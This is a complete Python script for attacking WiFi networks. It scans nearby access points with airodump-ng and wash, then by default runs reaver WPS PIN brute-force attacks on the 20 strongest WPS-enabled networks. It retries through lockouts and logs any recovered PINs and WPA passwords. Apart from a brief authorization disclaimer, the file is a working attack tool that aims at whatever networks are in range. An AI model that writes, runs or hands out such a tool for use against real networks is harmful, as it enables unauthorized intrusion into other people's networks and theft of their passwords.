#!/usr/bin/env python3
"""
wifi_audit.py

Active WiFi WPS penetration testing tool.

Phase 1: Runs airodump-ng (60s) and wash to scan for WPS-enabled networks
Phase 2: Attacks top 20 WPS-enabled targets by signal strength using reaver

Features:
- Live scan output
- Intelligent WPS lock detection and retry logic
- Association mode fallback (no-association -> direct)
- Real-time progress tracking
- Detailed results logging to file and console

Usage:
    # Passive scan only (no attacks):
    sudo python3 wifi_audit.py -i wlan0mon --passive

    # Active attack mode (default 60s scan):
    sudo python3 wifi_audit.py -i wlan0mon

    # Custom scan duration:
    sudo python3 wifi_audit.py -i wlan0mon -d 120

Requires:
    - airodump-ng (from aircrack-ng)
    - wash (from reaver)
    - reaver
    - iwconfig
    - python3

WARNING: Only use on networks you own or have explicit authorization to test.
         Unauthorized access to computer networks is illegal.
"""

import argparse
import csv
import subprocess
import time
import os
import sys
import re
from datetime import datetime
from dataclasses import dataclass, field
from typing import Dict, List, Optional


# ---------------------------------------------------------
# Data Classes
# ---------------------------------------------------------

@dataclass
class AccessPoint:
    bssid: str
    pwr: int
    channel: str
    essid: str
    privacy: str
    cipher: str
    auth: str
    wps: str = "?"
    locked: str = "?"
    status: str = "PENDING"


@dataclass
class AttackResult:
    target_num: int
    bssid: str
    essid: str
    channel: str
    status: str  # SUCCESS | FAILED | LOCKED
    wps_pin: str
    password: str
    time_spent: float
    retries: int


# ---------------------------------------------------------
# Helpers
# ---------------------------------------------------------

def check_monitor_mode(interface: str) -> bool:
    """Verify interface is in monitor mode."""
    try:
        output = subprocess.check_output(
            ["iwconfig", interface],
            stderr=subprocess.STDOUT
        ).decode()
        return "Mode:Monitor" in output
    except subprocess.CalledProcessError:
        return False


def run_airodump(interface: str, duration: int, prefix: str) -> str:
    """Run airodump-ng for `duration` sec and save CSV with live output."""
    csv_path = f"{prefix}-01.csv"

    print(f"[+] Running airodump-ng for {duration} seconds with live output...")
    proc = subprocess.Popen(
        ["sudo", "timeout", str(duration),
         "airodump-ng", "--write", prefix, "--output-format", "csv", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )

    # Display live output with progress
    start = time.time()
    while proc.poll() is None:
        elapsed = int(time.time() - start)

        # Read and display output
        line = proc.stdout.readline()
        if line:
            print(line.rstrip())

        # Check if time is up
        if elapsed >= duration:
            break

    proc.wait()
    print("\n[+] Finished airodump scan.")
    return csv_path


def parse_airodump_csv(csv_file: str) -> Dict[str, AccessPoint]:
    """Parse APs from airodump CSV."""
    aps = {}

    with open(csv_file, newline="", encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        in_ap_section = False

        for row in reader:
            if not row:
                continue

            if row[0] == "BSSID":
                in_ap_section = True
                continue

            if in_ap_section:
                if len(row) < 14:
                    continue

                try:
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    privacy = row[5].strip()
                    cipher = row[6].strip()
                    auth = row[7].strip()
                    pwr = row[8].strip()
                    essid = row[13].strip()
                except:
                    continue

                if not bssid or bssid == "Station MAC":
                    break

                pwr = int(pwr) if pwr not in ("", "NA") else -999

                aps[bssid] = AccessPoint(
                    bssid=bssid,
                    pwr=pwr,
                    channel=channel,
                    essid=essid,
                    privacy=privacy,
                    cipher=cipher,
                    auth=auth,
                )

    return aps


def run_wash(interface: str) -> Dict[str, Dict[str, str]]:
    """Run wash and collect WPS + Locked data."""
    print("[+] Running wash (passive WPS scan)...")

    try:
        output = subprocess.check_output(
            ["wash", "-i", interface],
            stderr=subprocess.DEVNULL
        ).decode()
    except:
        print("[!] wash failed or interface busy.")
        return {}

    wps_data = {}

    for line in output.splitlines():
        if ":" not in line or "BSSID" in line:
            continue

        parts = line.split()
        if len(parts) < 6:
            continue

        bssid = parts[0]
        wps_ver = parts[3]
        locked = parts[4]

        wps_data[bssid] = {
            "wps": wps_ver,
            "locked": locked,
        }

    return wps_data


def detect_wps_lock(output_line: str) -> bool:
    """Detect if reaver output indicates WPS lock."""
    lock_patterns = [
        "WARNING: Failed to associate",
        "WPS transaction failed",
        "Detected AP rate limiting",
        "Receive timeout occurred",
        "WPS transaction failed (code: 0x03)"
    ]
    return any(pattern in output_line for pattern in lock_patterns)


def wait_with_countdown(seconds: int, reason: str = "WPS lock detected"):
    """Display countdown timer."""
    print(f"\n[!] {reason}, waiting {seconds // 60} minutes...")
    end_time = time.time() + seconds

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        mins, secs = divmod(remaining, 60)
        print(f"\r[WAIT] {mins:02d}:{secs:02d} remaining...", end="", flush=True)
        time.sleep(1)

    print("\n[+] Resuming attack...")


def update_progress_header(stats: Dict):
    """Clear screen and redraw progress header with current stats."""
    # Clear screen (ANSI escape code)
    print("\033[2J\033[H", end="")

    print("=" * 50)
    print("=== WiFi WPS Audit Progress ===")
    print("=" * 50)

    total = stats['total']
    completed = stats['completed']
    percent = int((completed / total) * 100) if total > 0 else 0

    print(f"Progress: [{completed}/{total}] ({percent}%)")
    print(f"Success: {stats['success']} | Failed: {stats['failed']} | Locked: {stats['locked']}")

    if stats['current_target']:
        target = stats['current_target']
        idx = stats['current_index']
        print(f"Current Target: [{idx}/{total}] {target.essid} ({target.bssid})")

    print("=" * 50)
    print()


def run_reaver_attack(target: AccessPoint, interface: str, max_retries: int = 10) -> AttackResult:
    """
    Run reaver against a single target with lock detection/retry logic.
    """
    start_time = time.time()
    retry_count = 0
    use_no_association = True

    print(f"[+] Starting attack on {target.essid} ({target.bssid})")

    while retry_count <= max_retries:
        # Build reaver command
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target.bssid,
            "-c", target.channel,
            "-d", "3",
            "-vv"
        ]

        if use_no_association:
            cmd.append("-N")
            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (no-association mode)")
        else:
            print(f"[*] Attempt {retry_count + 1}/{max_retries + 1} (direct association mode)")

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

            last_progress_time = time.time()
            wps_pin = None
            password = None
            locked = False
            association_failed = False

            # Monitor output
            while True:
                line = proc.stdout.readline()
                if not line and proc.poll() is not None:
                    break

                if line:
                    print(line.rstrip())

                    # Check for success
                    if "[+] WPS PIN:" in line:
                        match = re.search(r"WPS PIN: '(\d+)'", line)
                        if match:
                            wps_pin = match.group(1)
                            last_progress_time = time.time()

                    if "[+] WPA PSK:" in line:
                        match = re.search(r"WPA PSK: '(.+)'", line)
                        if match:
                            password = match.group(1)
                            last_progress_time = time.time()

                    # Check for lock
                    if detect_wps_lock(line):
                        locked = True

                    # Check for association failure
                    if "Failed to associate" in line or "WARNING: Failed to associate" in line:
                        association_failed = True

                    # Any progress resets timer
                    if any(indicator in line for indicator in ["Trying pin", "Sending", "Received"]):
                        last_progress_time = time.time()

                # Check if stuck (no progress for 60 seconds)
                if time.time() - last_progress_time > 60:
                    print("[!] No progress for 60 seconds, assuming locked")
                    locked = True
                    proc.kill()
                    break

            proc.wait()

            # Check if we succeeded
            if wps_pin:
                elapsed = time.time() - start_time
                print(f"[+] SUCCESS! WPS PIN: {wps_pin}")
                if password:
                    print(f"[+] Password: {password}")
                return AttackResult(
                    target_num=0,  # Will be set by caller
                    bssid=target.bssid,
                    essid=target.essid,
                    channel=target.channel,
                    status="SUCCESS",
                    wps_pin=wps_pin,
                    password=password or "-",
                    time_spent=elapsed,
                    retries=retry_count
                )

            # Handle association failure - switch modes
            if association_failed and use_no_association:
                print("[!] No-association mode failed, switching to direct association")
                use_no_association = False
                continue

            # Handle WPS lock
            if locked:
                retry_count += 1
                if retry_count <= max_retries:
                    wait_with_countdown(300, "WPS lock detected")  # 5 minutes
                    use_no_association = True  # Reset to no-association for retry
                else:
                    print(f"[!] Max retries ({max_retries}) reached, target locked")
                    elapsed = time.time() - start_time
                    return AttackResult(
                        target_num=0,
                        bssid=target.bssid,
                        essid=target.essid,
                        channel=target.channel,
                        status="LOCKED",
                        wps_pin="-",
                        password="-",
                        time_spent=elapsed,
                        retries=retry_count
                    )
            else:
                # Failed for other reasons
                retry_count += 1
                if retry_count <= max_retries:
                    print(f"[!] Attack failed, retrying ({retry_count}/{max_retries})...")
                    time.sleep(5)

        except Exception as e:
            print(f"[!] Error during attack: {e}")
            retry_count += 1
            if retry_count <= max_retries:
                time.sleep(5)

    # Failed after all retries
    elapsed = time.time() - start_time
    return AttackResult(
        target_num=0,
        bssid=target.bssid,
        essid=target.essid,
        channel=target.channel,
        status="FAILED",
        wps_pin="-",
        password="-",
        time_spent=elapsed,
        retries=retry_count
    )


def print_table(aps: List[AccessPoint]):
    """Pretty table."""
    headers = [
        ("#", 3), ("PWR", 4), ("CH", 3),
        ("BSSID", 17), ("ESSID", 20),
        ("ENC", 7), ("CIPH", 6), ("AUTH", 6),
        ("WPS", 5), ("LOCK", 5), ("STATUS", 10),
    ]

    print("\n=== WiFi Passive Audit Table ===")
    print("(sorted by strongest signal)\n")

    # header
    line = "  " + "  ".join(h[0].ljust(h[1]) for h in headers)
    print(line)
    print("  " + "  ".join("-" * h[1] for h in headers))

    for i, ap in enumerate(aps, 1):
        row = [
            str(i).ljust(3),
            str(ap.pwr).ljust(4),
            ap.channel.ljust(3),
            ap.bssid.ljust(17),
            ap.essid[:20].ljust(20),
            ap.privacy.ljust(7),
            ap.cipher.ljust(6),
            ap.auth.ljust(6),
            ap.wps.ljust(5),
            ap.locked.ljust(5),
            ap.status.ljust(10),
        ]
        print("  " + "  ".join(row))


def save_results_to_file(results: List[AttackResult], interface: str, filename: str):
    """Save attack results to log file."""
    with open(filename, 'w') as f:
        f.write(f"WiFi Audit Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Interface: {interface}\n")
        f.write(f"Targets Scanned: {len(results)}\n")
        f.write("\n")

        for result in results:
            f.write(f"[{result.target_num}/{len(results)}] BSSID: {result.bssid} | ESSID: {result.essid} | Channel: {result.channel}\n")
            f.write(f"Status: {result.status}\n")

            if result.status == "SUCCESS":
                f.write(f"WPS PIN: {result.wps_pin}\n")
                f.write(f"Password: {result.password}\n")

            mins, secs = divmod(int(result.time_spent), 60)
            f.write(f"Time: {mins}m {secs}s\n")
            f.write(f"Retries: {result.retries}\n")
            f.write("\n")

    print(f"[+] Results saved to {filename}")


def print_results_table(results: List[AttackResult]):
    """Format and display final results table to console."""
    success_count = sum(1 for r in results if r.status == "SUCCESS")
    failed_count = sum(1 for r in results if r.status == "FAILED")
    locked_count = sum(1 for r in results if r.status == "LOCKED")

    print("\n" + "=" * 80)
    print("=== Final Attack Results ===")
    print("=" * 80)
    print(f"Total Targets: {len(results)}")
    print(f"Successful: {success_count}")
    print(f"Failed: {failed_count}")
    print(f"Locked: {locked_count}")
    print()

    print("Detailed Results:")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")
    print("| #  | BSSID             | ESSID                | Status   | WPS PIN   | Password     | Time     |")
    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")

    for result in results:
        mins, secs = divmod(int(result.time_spent), 60)
        time_str = f"{mins}m {secs}s"

        print(f"| {result.target_num:<2} | {result.bssid:<17} | {result.essid[:20]:<20} | {result.status:<8} | {result.wps_pin:<9} | {result.password[:12]:<12} | {time_str:<8} |")

    print("+" + "-" * 4 + "+" + "-" * 19 + "+" + "-" * 22 + "+" + "-" * 10 + "+" + "-" * 11 + "+" + "-" * 14 + "+" + "-" * 10 + "+")


# ---------------------------------------------------------
# Main
# ---------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='WiFi WPS penetration testing tool - Scans and attacks WPS-enabled networks',
        epilog='WARNING: Only use on networks you own or have authorization to test.',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        metavar="IFACE",
        help="wireless interface in monitor mode (required)"
    )
    parser.add_argument(
        "-d", "--duration",
        type=int,
        default=60,
        metavar="SEC",
        help="airodump-ng scan duration in seconds (default: 60)"
    )
    parser.add_argument(
        "-o", "--output-prefix",
        default="scan",
        metavar="PREFIX",
        help="output file prefix for scan results (default: scan)"
    )
    parser.add_argument(
        "--passive",
        action="store_true",
        help="passive scan only, no WPS attacks (default: active mode)"
    )
    args = parser.parse_args()

    # Check if interface is in monitor mode
    print("[*] Checking interface mode...")
    if not check_monitor_mode(args.interface):
        print(f"[!] Error: Interface {args.interface} is not in monitor mode")
        print("[!] Please enable monitor mode first (e.g., 'sudo airmon-ng start wlan0')")
        sys.exit(1)
    print(f"[+] Interface {args.interface} is in monitor mode")

    # Run airodump scan
    csv_file = run_airodump(args.interface, args.duration, args.output_prefix)
    aps = parse_airodump_csv(csv_file)
    wps_info = run_wash(args.interface)

    # Merge WPS + Locked info
    for bssid, ap in aps.items():
        if bssid in wps_info:
            ap.wps = wps_info[bssid]["wps"]
            ap.locked = wps_info[bssid]["locked"]

    # Sort strongest first (PWR closer to 0)
    sorted_aps = sorted(aps.values(), key=lambda x: x.pwr, reverse=True)

    # Display passive scan results
    print_table(sorted_aps)

    # If passive mode, stop here
    if args.passive:
        print("[*] Passive mode - no attacks will be performed")
        return

    # Filter for WPS-enabled targets that are not locked
    wps_targets = [
        ap for ap in sorted_aps
        if ap.wps != "?" and ap.locked != "Yes"
    ]

    if not wps_targets:
        print("[!] No WPS-enabled targets found")
        return

    # Take top 20
    targets = wps_targets[:20]
    print(f"\n[+] Found {len(wps_targets)} WPS-enabled targets")
    print(f"[+] Attacking top {len(targets)} targets\n")

    # Initialize progress stats
    stats = {
        'total': len(targets),
        'completed': 0,
        'success': 0,
        'failed': 0,
        'locked': 0,
        'current_target': None,
        'current_index': 0
    }

    results = []

    # Attack each target
    for idx, target in enumerate(targets, 1):
        stats['current_target'] = target
        stats['current_index'] = idx
        update_progress_header(stats)

        # Run attack
        result = run_reaver_attack(target, args.interface, max_retries=10)
        result.target_num = idx

        # Update stats
        stats['completed'] += 1
        if result.status == "SUCCESS":
            stats['success'] += 1
        elif result.status == "LOCKED":
            stats['locked'] += 1
        else:
            stats['failed'] += 1

        results.append(result)

    # Display final results
    print_results_table(results)

    # Save results to file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"wifi_audit_results_{timestamp}.txt"
    save_results_to_file(results, args.interface, log_filename)


if __name__ == "__main__":
    main()
